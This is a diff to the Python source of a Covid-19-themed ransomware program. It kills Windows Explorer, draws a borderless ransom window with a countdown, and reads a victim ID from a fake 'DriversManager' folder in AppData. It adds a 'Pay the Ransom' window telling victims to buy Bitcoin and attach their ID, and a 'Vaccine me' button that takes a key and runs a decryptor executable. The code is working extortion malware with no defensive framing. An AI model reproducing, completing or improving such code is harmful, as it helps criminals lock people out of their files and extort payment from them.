@@ -13,7 +13,6 @@ letter_drive = os.environ["SystemDrive"]
 # INITIATION OF VARIABLES TO CALL FUNCTIONS IN CLASSES
 dk = delproc.Kill()
 dr = delproc.Remove()
-
 # TRY TO REMOVE EXPLORER IF NOT DELETED BEFORE
 try:
     dk.exp()
@@ -25,9 +24,18 @@ except:
 
 # INIT WINDOW FOR GUI COUNTER
 window = Tk()
-
-# PATH TO DB.TXT FILE
+# INSTRUCTION to desactived the header who contains the resize, minimize and exit window
+window.overrideredirect(1)
+# PATH TO DB.TXT FILE AND READ ID NUMBER
 src = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\db.txt".format(letter_drive, current_user)
+num = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\id".format(letter_drive, current_user)
+with open(num, "r") as num:
+    id = num.read()
+
+# SET BACKGROUND FOR COUNTER TIME
+canvas = Canvas(window, width=200, height=100, bg="red")
+canvas.pack()
+text_clock = canvas.create_text(100, 50)
 
 # FUNCTION TO SET A TIME
 def updateTime(generator):
@@ -71,16 +79,32 @@ def warning():
     wrn.pack()
 
 # BUTTON PAYMENT ACTION
-def action_pay():
-    try:
-        action = os.system('start firefox.exe "https://coinpot.co"')
-    except:
-        action = os.system('start iexplore.exe "https://coinpot.co"')
-
 def pay():
-    btn = tk.Button(window, text="Pay the Ransom", font="bold", fg="red", bg="black", command=lambda:action_pay())
+    btn = tk.Button(window, text="Pay the Ransom", font="bold", fg="red", bg="black", command=lambda:openNewWindowPayToKey())
     btn.pack(side=tk.BOTTOM)
+def close_pay():
+    newWindow.destroy()
+# FUNCTION TO SPAWN NEW WINDOW FOR "PAY THE RANSOM"
+def openNewWindowPayToKey():
+    global newWindow
+    newWindow = Toplevel(window)
+    newWindow.title("Payment Instruction")
+    newWindow.geometry("600x600")
+    Label(newWindow, font="bold", text ="\n\nInstructions:\n\n \
+    You must go to a crypto currency platform, such as coinpot.co, or coinbase.com.\n\n \
+    You will need to create an account to be able to purchase 'Bitcoin', which you will use to pay for the Ransom.\n\n\
+    When you are going to send the payment, you have to attach the ID number : {} in a comment.".format(id)).pack()
+    # CREATE CANVAS FOR ENTRY BOX
+    canvas1 = tk.Canvas(newWindow, width = 200, height = 100)
+    canvas1.pack()
+    # CREATE BUTTON TO CALL ACTION
+    btn = tk.Button(newWindow, text="Close", font="bold", fg="red", bg="black", command=lambda:close_pay())
+    btn.pack()
 
+# BUTTON DECRYPT ACTION
+def decrypt():
+    btn = tk.Button(window, text="Decrypt Your Data", font="bold", fg="red", bg="black", command=lambda:openNewWindowDecrypt())
+    btn.pack(side=tk.BOTTOM)
 # BUTTON DECRYPT ACTION
 def action_decrypt():
     prompt_user = entry1.get()
@@ -89,12 +113,8 @@ def action_decrypt():
         key.write(prompt_user)
     action = os.system("{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\vaccine.exe".format(letter_drive, current_user))
     newWindow.destroy()
-
-def decrypt():
-    btn = tk.Button(window, text="Decrypt Your Data", font="bold", fg="red", bg="black", command=lambda:openNewWindow())
-    btn.pack(side=tk.BOTTOM)
-
-def openNewWindow():
+# FUNCTION TO SPAWN NEW WINDOW FOR "DECRYPT YOUR DATA"
+def openNewWindowDecrypt():
     global newWindow
     newWindow = Toplevel(window)
     newWindow.title("Vaccine of Covid-19")
@@ -111,13 +131,7 @@ def openNewWindow():
     btn = tk.Button(newWindow, text="Vaccine me", font="bold", fg="red", bg="black", command=lambda:action_decrypt())
     btn.pack()
 
-# INSTRUCTION to desactived the header who contains the resize, minimize and exit window
-window.overrideredirect(1)
-canvas = Canvas(window, width=200, height=100, bg="red")
-canvas.pack()
-text_clock = canvas.create_text(100, 50)
-
-# FUNCTION TO CONTROL IF DB.txt EXIST
+# FUNCTION TO CONTROL IF DB.TXT EXIST
 try:
     with open(src, "r") as db:
         db = db.read()
